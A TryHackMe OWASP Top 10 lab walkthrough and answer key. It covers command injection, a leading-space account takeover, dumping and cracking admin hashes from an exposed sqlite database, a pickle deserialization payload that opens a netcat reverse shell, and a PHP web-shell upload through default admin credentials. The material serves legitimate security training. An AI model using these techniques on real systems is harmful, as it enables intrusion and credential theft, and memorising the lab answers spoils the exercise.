## Introduction

- Join the machine
- Read Instructions and click on Complete.
## Accessing machines

- Goto Access and get ovpn file to connect https://tryhackme.com/access

## [Severity 1] OS Command Injection

- Read this section and mentioned [article](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell), then  click on Complete. 
## [Severity 1] Command Injection Practical

- Start Machine and get Target IP from "Target Machine Information". Now, open `http://machine_ip/evilshell.php`.
- Now, type commands and submit. You can see output below.
- Question `What strange text file is in the website root directory?` Answer `drpepper.txt`. Running `ls` command will show this strange text file.
- Question `How many non-root/non-service/non-daemon users are there?` Answer `0`. Running `cat /etc/passwd` will show.
- Question `What user is this app running as?` Answer `www-data`. Used command `whoami`.

- Question `Print out the MOTD.  What favorite beverage is shown?` Answer `DR PEPPER`. Used command `cat /etc/update-motd.d/00-header`.
## [Severity 2] Broken Authentication

- Read this section carefully and click on Complete.
## [Severity 2] Broken Authentication Practical

- Question `What is the flag that you found in darren's account?` Answer `fe860794************74b667`. To get flag inside darren's account, register as " darren" and login. Here you need to use whitespace before darren's name.
- Test same trick with user `arthur` and click on Complete.
- Question `What is the flag that you found in arthur's account?` Answer `d9ac0f7************75e16e`.
## [Severity 3] Sensitive Data Exposure (Introduction)

- If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
- Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Supporting Material 1)

- Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Supporting Material 2)

- Read this section carefully and click on Complete.
## [Severity 3] Sensitive Data Exposure (Challenge)

- If we open the machine link and check source, we can get a image link to `http://machine_ip/assets/images/lake-taupo.jpg`.
- Now if we navigate to `http://machine_ip/assets` directory, there is a sensitive databse file named `webapp.db`.
- Question `What is the name of the mentioned directory?` Answer `/assets`.
- Question `Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?` Answer `webapp.db`. It's a file inside `/assets`.
- Now Downloding the file and analyzing the file with `file webapp.db` command shows it's a `sqlite3` file. Now, we can read the db file with `sqlite3 webapp.db`.
- If we use `.table` command to get table names, we will see there is two table named `session` and `users`. We can get column names using `PRAGMA table_info(users);` command.
   ```bash
    $> sqlite3 webapp.db 
     SQLite version 3.37.2 2022-01-06 13:25:41
     Enter ".help" for usage hints.
    sqlite> .tables
    sessions  users   
    sqlite> PRAGMA table_info(users);
    0|userID|TEXT|1||1
    1|username|TEXT|1||0
    2|password|TEXT|1||0
    3|admin|INT|1||0
    sqlite> 
   ```
- `select * from users;` will show user's details inside the table. We can get admin hash there `6eea9b7ef191*******0f6c05ceb`.
  ```bash
    sqlite> select * from users;
    4413096d9c933359b898b6202288a650|admin|6eea9b7ef191******f6c05ceb|1
    23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
    4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
    sqlite> 
  ```
- Question `Use the supporting material to access the sensitive data. What is the password hash of the admin user?` Answer `6eea9b7ef191*****dd0f6c05ceb`.
- Question `What is the admin's plaintext password?` Answer `qwe****op`. We can crack the hash using [CrackStation](https://crackstation.net/).
- Question `Login as the admin. What is the flag?` Answer `THM{Yzc2Yjd*************diMjdl}`. If we goto `http://machine_ip/login` and login with username `admin` and the cracked password `qw*****iop`, it will redirect to `http://machine_ip/console/`. There we can get the flag.

First we need to change download [pickleme.py](https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py) and  "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. To get IP of TryHackMe you can use `ifconfig tun0 |grep destination |cut -d" " -f10` command. Then run the python script with `python3 pickleme.py`. Copy the cookie and add a cookie with that value, name it `encodedPayload`. Reload feedback page. You will get a netcat shell. You can read flag using `cat ../flag.txt` command.

## [Severity 9] Components With Known Vulnerabilities - Intro

- Read Instructions and click on Complete.
## [Severity 9] Components With Known Vulnerabilities - Exploit

- Read Instructions and click on Complete.
## [Severity 9] Components With Known Vulnerabilities - Lab

- If any machine is running, terminate that machine first. Then Start this Machine. Copy Target IP from "Target Machine Information".
- When we open `http://machine_ip`, we get link to `http://machine_ip/admin.php` and `projectworlds.in` link. After searching bookstore on `projectworlds.in`, we get this page https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/ with default credential username: admin@admin.com password: admin.
- After logging into admin panel, we can upload our shell by editing any book. Shell code, `<?php system('wc -c /etc/passwd'); ?>` in shell.php. After going to edit book, upload shell.php with `change` button.
- Now to find the shell, open location of image. You can find all images in `/bootstrap/img` directory. Just open the directory in the link, you can get your uploaded shell there, `http://machine_ip/bootstrap/img/shell.php`. If you open the page, it will compile and execute the code to display character number of `/etc/passwd`.
- Question `How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)` Answer `1611`
## [Severity 10] Insufficient Logging and Monitoring
